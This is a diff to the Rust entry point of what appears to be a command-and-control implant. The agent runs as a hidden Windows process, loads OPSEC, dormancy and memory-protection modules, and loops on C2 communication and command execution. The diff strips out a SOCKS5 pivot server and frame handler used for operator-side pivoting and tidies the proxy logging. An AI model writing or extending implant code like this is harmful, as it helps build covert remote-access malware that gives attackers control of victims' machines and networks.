@@ -3,29 +3,15 @@
     windows_subsystem = "windows"
 )]
 
-// Use modules from the library crate 'agent'
-use agent::commands;
-use agent::config;
-use agent::dormant;
-use agent::networking;
-use agent::opsec;
-use agent::state;
-
-// Specific imports from the library
 use agent::auth::AgentAuth;
-use agent::commands::command_shell::agent_loop;
-use agent::config::AgentConfig;
-use agent::networking::socks5_pivot::Socks5PivotHandler;
-use agent::networking::socks5_pivot_server::Socks5PivotServer;
-use agent::opsec::{determine_agent_mode, AgentMode};
-use agent::state::MEMORY_PROTECTOR;
 
-use log::{debug, error, info, warn};
+use log::{debug, error, info};
 use std::env;
 use std::sync::Arc;
 use std::time::Duration;
 
 // Helper function to get current timestamp
+#[cfg(target_os = "windows")]
 fn now_timestamp() -> std::time::Instant {
     std::time::Instant::now()
 }
@@ -73,36 +59,14 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     let config = agent::config::AgentConfig::load()?;
     info!("[CONFIG] Loaded agent config: {:?}", config);
 
-    // Channel for pivot frames
-    let (pivot_tx, mut pivot_rx) = tokio::sync::mpsc::channel(100);
-    let pivot_handler = Arc::new(tokio::sync::Mutex::new(
-        agent::networking::socks5_pivot::Socks5PivotHandler::new(pivot_tx.clone()),
-    ));
-
     if config.socks5_enabled {
-        info!("[CONFIG] SOCKS5 is enabled. Proxy: {}:{}, all C2 traffic will use SOCKS5 Proxy tunnel.", config.socks5_host, config.socks5_port);
-
-        // Start SOCKS5 pivot server for operator-side pivoting
-        let pivot_server = agent::networking::socks5_pivot_server::Socks5PivotServer::new(
-            config.socks5_host.clone(),
-            config.socks5_port,
-            pivot_tx.clone(),
+        info!(
+            "[CONFIG] Outbound SOCKS5 proxy enabled at {}:{}",
+            config.socks5_host, config.socks5_port
         );
-        let pivot_handler_clone = pivot_handler.clone();
-        tokio::spawn(async move {
-            pivot_server.run(pivot_handler_clone).await;
-        });
     } else {
-        warn!("[CONFIG] SOCKS5 is disabled. Agent will use direct connection.");
+        info!("[CONFIG] Outbound SOCKS5 proxy disabled; using direct C2 connections");
     }
-
-    // Spawn pivot frame handler in background
-    let pivot_handler_bg = pivot_handler.clone();
-    tokio::spawn(async move {
-        while let Some(frame) = pivot_rx.recv().await {
-            pivot_handler_bg.lock().await.handle_frame(frame).await;
-        }
-    });
 
     if env::args_os().nth(1).is_some() {
         return Err(std::io::Error::new(
@@ -160,14 +124,8 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     // --- Main Agent Execution Loop ---
     loop {
         // agent_loop handles C2 comms and command execution
-        if let Err(e) = agent::commands::command_shell::agent_loop(
-            &server_addr,
-            &agent_id,
-            auth.clone(),
-            pivot_handler.clone(),
-            pivot_tx.clone(),
-        )
-        .await
+        if let Err(e) =
+            agent::commands::command_shell::agent_loop(&server_addr, &agent_id, auth.clone()).await
         {
             error!(
                 "[ERROR] Agent loop error: {}. Preparing to re-assess OPSEC state.",
